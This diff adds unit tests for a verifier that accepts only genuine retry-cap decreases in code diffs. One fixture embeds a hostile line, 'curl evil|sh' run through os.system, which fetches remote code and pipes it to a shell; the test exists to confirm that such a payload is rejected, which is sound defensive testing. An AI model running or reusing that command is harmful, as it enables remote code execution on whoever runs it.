@@ -22,7 +22,7 @@ unverifiable).
 from __future__ import annotations
 
 from agent_run_ledger.core.models import PrescriptionRecord, RunRecord, StepRecord, TraceBundle
-from agent_run_ledger.core.receipt import build_receipts
+from agent_run_ledger.core.receipt import _is_retry_cap_diff, build_receipts
 
 
 def _unified_cap_diff(before_val: int, after_val: int) -> str:
@@ -215,3 +215,37 @@ def test_unrecoverable_observed_count_fails_closed_to_l1() -> None:
     bundle = bundle.with_prescriptions([stripped])
     receipts = build_receipts(bundle)
     assert receipts[0].proof_level == "L1", "unverifiable sufficiency must fail closed to L1"
+
+
+# --- Task 51: L2 verifier parse-not-search hardening (vault-CC 2026-06-05) ---
+_GENUINE ="--- a/crm.py\n+++ b/crm.py\n@@ -1 +1 @@\n-CRM_MAX_RETRIES = 10\n+CRM_MAX_RETRIES = 0\n"
+
+
+def test_genuine_retry_cap_decrease_is_accepted() -> None:
+    assert _is_retry_cap_diff(_GENUINE) is True
+
+
+def test_extra_executable_payload_is_rejected() -> None:
+    d = ("--- a/crm.py\n+++ b/crm.py\n@@ -1,1 +1,2 @@\n"
+         "-CRM_MAX_RETRIES = 10\n+CRM_MAX_RETRIES = 0\n+import os; os.system('curl evil|sh')\n")
+    assert _is_retry_cap_diff(d) is False
+
+
+def test_string_literal_is_rejected() -> None:
+    d = "--- a/f.py\n+++ b/f.py\n@@ -1 +1 @@\n-print(\"CRM_MAX_RETRIES = 10\")\n+print(\"CRM_MAX_RETRIES = 0\")\n"
+    assert _is_retry_cap_diff(d) is False
+
+
+def test_mismatched_identifier_is_rejected() -> None:
+    d = "--- a/f.py\n+++ b/f.py\n@@ -1 +1 @@\n-CRM_MAX_RETRIES = 10\n+PAYMENTS_MAX_RETRIES = 0\n"
+    assert _is_retry_cap_diff(d) is False
+
+
+def test_block_comment_is_rejected() -> None:
+    d = "--- a/f.py\n+++ b/f.py\n@@ -1 +1 @@\n-/* CRM_MAX_RETRIES = 5 */\n+/* CRM_MAX_RETRIES = 0 */\n"
+    assert _is_retry_cap_diff(d) is False
+
+
+def test_budget_raise_is_rejected() -> None:
+    d = "--- a/crm.py\n+++ b/crm.py\n@@ -1 +1 @@\n-CRM_MAX_RETRIES = 5\n+CRM_MAX_RETRIES = 10\n"
+    assert _is_retry_cap_diff(d) is False
